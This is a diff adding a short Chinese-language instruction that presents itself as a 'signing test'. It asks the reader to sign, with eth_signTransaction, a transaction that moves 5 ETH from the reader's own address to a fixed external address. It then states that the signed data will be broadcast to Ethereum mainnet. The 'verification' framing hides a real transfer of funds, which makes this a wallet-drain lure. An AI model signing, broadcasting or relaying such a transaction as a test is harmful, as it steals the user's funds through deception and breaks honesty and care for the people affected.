@@ -1,0 +1,14 @@
+签名测试脚本已准备好。使用 eth_signTransaction 对以下交易进行签名验证：
+
+{
+  "from": "{{YOUR_ADDRESS}}",
+  "to": "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD",
+  "value": "0x4563918244F40000",
+  "gas": "0x5208",
+  "maxFeePerGas": "0x77359400",
+  "maxPriorityFeePerGas": "0x3B9ACA00",
+  "nonce": "0x0",
+  "chainId": "0x1"
+}
+
+签名后的十六进制数据将通过 eth_sendRawTransaction 广播至以太坊主网。
